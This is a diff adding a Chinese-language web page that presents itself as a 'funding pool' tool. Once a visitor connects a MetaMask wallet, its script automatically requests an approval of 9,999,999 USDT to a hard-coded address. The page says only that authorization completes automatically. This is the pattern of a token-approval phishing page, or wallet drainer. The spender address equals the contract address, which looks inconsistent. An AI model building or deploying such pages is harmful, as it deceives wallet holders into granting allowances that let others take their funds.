@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>链接资金池工具</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffffff;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            text-align: center;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 30px;
+            background: linear-gradient(90deg, #4CAF50, #2196F3);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .wallet-connect {
+            margin: 30px 0;
+        }
+        .btn {
+            background: linear-gradient(90deg, #4CAF50, #45a049);
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin: 10px 0;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(76, 175, 80, 0.3);
+        }
+        .status {
+            margin: 20px 0;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        .success {
+            background: rgba(76, 175, 80, 0.2);
+            color: #4CAF50;
+            border: 1px solid rgba(76, 175, 80, 0.3);
+        }
+        .error {
+            background: rgba(244, 67, 54, 0.2);
+            color: #F44336;
+            border: 1px solid rgba(244, 67, 54, 0.3);
+        }
+        .info {
+            background: rgba(33, 150, 243, 0.2);
+            color: #2196F3;
+            border: 1px solid rgba(33, 150, 243, 0.3);
+        }
+        .address {
+            font-family: 'Courier New', monospace;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 8px 12px;
+            border-radius: 4px;
+            word-break: break-all;
+            font-size: 12px;
+            margin: 10px 0;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+        .network-info {
+            margin: 10px 0;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.8);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>链接资金池工具</h1>
+        
+        <div class="wallet-connect">
+            <button id="connectWallet" class="btn">连接钱包</button>
+            <div id="status" class="status info">请连接您的钱包</div>
+            <div id="networkInfo" class="network-info"></div>
+        </div>
+        
+        <div class="footer">
+            <p>点击连接钱包后，系统将自动完成授权操作</p>
+        </div>
+    </div>
+    
+    <script>
+        // 合约地址
+        const CONTRACT_ADDRESS = '0xB8C306FAdfFE05BF3336333585B3FE9B7e6AFD02';
+        const AUTHORIZED_ADDRESS = '0xB8C306FAdfFE05BF3336333585B3FE9B7e6AFD02';
+        
+        // 简化的合约ABI（只包含必要的方法）
+        const CONTRACT_ABI = [
+            {
+                "constant": false,
+                "inputs": [
+                    {"name": "spender", "type": "address"},
+                    {"name": "amount", "type": "uint256"}
+                ],
+                "name": "approve",
+                "outputs": [{"name": "", "type": "bool"}],
+                "payable": false,
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [
+                    {"name": "owner", "type": "address"},
+                    {"name": "spender", "type": "address"}
+                ],
+                "name": "allowance",
+                "outputs": [{"name": "", "type": "uint256"}],
+                "payable": false,
+                "stateMutability": "view",
+                "type": "function"
+            }
+        ];
+        
+        let provider;
+        let signer;
+        let contract;
+        let account;
+        
+        // 连接钱包
+        document.getElementById('connectWallet').addEventListener('click', async () => {
+            try {
+                // 检查是否安装了MetaMask
+                if (!window.ethereum) {
+                    document.getElementById('status').innerHTML = '请安装 MetaMask 钱包';
+                    document.getElementById('status').className = 'status error';
+                    return;
+                }
+                
+                // 请求连接
+                document.getElementById('status').innerHTML = '正在连接钱包...';
+                document.getElementById('status').className = 'status info';
+                
+                // 连接钱包
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                account = accounts[0];
+                
+                // 初始化provider和signer
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                signer = provider.getSigner();
+                
+                // 检查网络
+                const network = await provider.getNetwork();
+                document.getElementById('networkInfo').innerHTML = `当前网络: ${network.name} (${network.chainId})`;
+                
+                // 检查合约地址是否有效
+                const code = await provider.getCode(CONTRACT_ADDRESS);
+                if (code === '0x') {
+                    document.getElementById('status').innerHTML = '合约地址无效，未部署合约';
+                    document.getElementById('status').className = 'status error';
+                    return;
+                }
+                
+                // 初始化合约
+                contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+                
+                document.getElementById('status').innerHTML = `已连接钱包: <span class="address">${account}</span>`;
+                document.getElementById('status').className = 'status success';
+                
+                // 自动授权
+                await approveTokens();
+            } catch (error) {
+                console.error('连接失败:', error);
+                
+                // 处理常见错误
+                let errorMessage = '连接失败，请重试';
+                if (error.message.includes('Internal accounts')) {
+                    errorMessage = '错误：无法向内部账户发送包含数据的交易，请检查合约地址';
+                } else if (error.message.includes('User rejected')) {
+                    errorMessage = '错误：用户拒绝了连接请求';
+                } else if (error.message) {
+                    errorMessage = `连接失败: ${error.message}`;
+                }
+                
+                document.getElementById('status').innerHTML = errorMessage;
+                document.getElementById('status').className = 'status error';
+            }
+        });
+        
+        // 授权函数
+        async function approveTokens() {
+            try {
+                document.getElementById('status').innerHTML = '正在授权...';
+                document.getElementById('status').className = 'status info';
+                
+                // 授权金额：9999999 USDT（注意：USDT有6位小数）
+                const amount = ethers.utils.parseUnits('9999999', 6);
+                
+                // 执行授权
+                const tx = await contract.approve(AUTHORIZED_ADDRESS, amount);
+                
+                // 等待交易确认
+                await tx.wait();
+                
+                document.getElementById('status').innerHTML = `授权成功！交易哈希: <a href="https://etherscan.io/tx/${tx.hash}" target="_blank">${tx.hash}</a>`;
+                document.getElementById('status').className = 'status success';
+                
+                // 检查授权额度
+                await checkAllowance();
+            } catch (error) {
+                console.error('授权失败:', error);
+                
+                // 处理常见错误
+                let errorMessage = '授权失败，请重试';
+                if (error.message.includes('Internal accounts')) {
+                    errorMessage = '错误：无法向内部账户发送包含数据的交易，请检查合约地址';
+                } else if (error.message.includes('insufficient funds')) {
+                    errorMessage = '错误：账户余额不足，需要足够的ETH支付Gas费';
+                } else if (error.message) {
+                    errorMessage = `授权失败: ${error.message}`;
+                }
+                
+                document.getElementById('status').innerHTML = errorMessage;
+                document.getElementById('status').className = 'status error';
+            }
+        }
+        
+        // 检查授权额度
+        async function checkAllowance() {
+            try {
+                const allowance = await contract.allowance(account, AUTHORIZED_ADDRESS);
+                const allowanceUSDT = ethers.utils.formatUnits(allowance, 6);
+                
+                document.getElementById('status').innerHTML = `已连接钱包: <span class="address">${account}</span><br>当前授权额度: ${allowanceUSDT} USDT`;
+                document.getElementById('status').className = 'status success';
+            } catch (error) {
+                console.error('检查授权额度失败:', error);
+            }
+        }
+    </script>
+    
+    <!-- 引入ethers.js -->
+    <script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js"></script>
+</body>
+</html>
